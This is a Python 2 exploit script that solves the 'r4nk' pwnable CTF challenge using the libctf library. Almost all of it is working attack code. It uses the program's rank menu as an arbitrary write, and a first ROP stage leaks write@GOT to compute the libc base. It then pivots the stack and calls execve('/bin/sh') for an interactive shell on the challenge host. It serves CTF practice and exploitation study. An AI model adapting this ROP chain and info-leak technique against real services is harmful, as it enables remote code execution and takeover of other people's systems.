#!/usr/bin/env python2

from libctf import *

"""
Exploit solution for r4nk pwnable challenge
https://github.com/rootfoo/libctf
By: meta
"""

def rank(sock, start, values):
   # use the rank menu as write-what-where 
   # fill stack from high to low addresses so we overwrite saved RIP last
   i = start + len(values) -1
   last = ""
   for v in reversed(values):
      for x in (2,i,v):
	 last = sock.sr(str(x) + '\n')
      i -= 1
   return last



if __name__=='__main__':
   # socat -d -d tcp4-l:2301,reuseaddr,fork exec:"./r4nk"
   #sock = Sock('localhost', 2301, verbose=True, timeout=.1)
   sock = Sock('challenges.fbctf.com', 1339, verbose=True, timeout=.2)
   sock.read()

   # gadgets and other addresses from objdump, readelf, ROPgadget
   prompt = 0x0004008b0
   pop_rdi = 0x0000000000400b43
   pop_rsi_r15 = 0x0000000000400b41
   pop_rsp_r13 = 0x0000000000400980
   buf = 0x602100
   write_got = 0x602018
   execve_offset = 0x00000000000e4e30
   write_offset = 0x0000000000110140

   # first stage payload; write with rank() menu
   stage1 = [
      pop_rdi,         # pop address of write@got into rdi
      write_got,
      pop_rsi_r15,     # pop 8 into rsi, anything into r15
      8,
      42,
      prompt,          # return to prompt() function
      pop_rsp_r13,     # stack pivot to address of buffer
      buf,
      42,              # just to fill r13
   ]

   # info leak
   leak = rank(sock, -1, stage1)
   print leak
   print sock.read()

   # calculate libc relocation via write GOT entry
   write_addr = unpack64(leak)
   libc_start = write_addr - write_offset
   execve_addr = libc_start + execve_offset
   print("address of write: {}".format(hex(write_addr)))
   print("address of execve: {}".format(hex(execve_addr)))

   stage2 = rop64(
      'A'*8,          # single word for alignment, this will land at &buf
      pop_rdi,        # pop address of "/bin/sh" into rdi
      buf+8*7,       
      pop_rsi_r15,    # pop 0 into rsi, anything into r15
      0,
      0,
      execve_addr,    # return to execve
      "/bin/sh\0",
      )

   # send stage 2 and make interactive for shell
   sock.write(stage2)
   sock.interact()
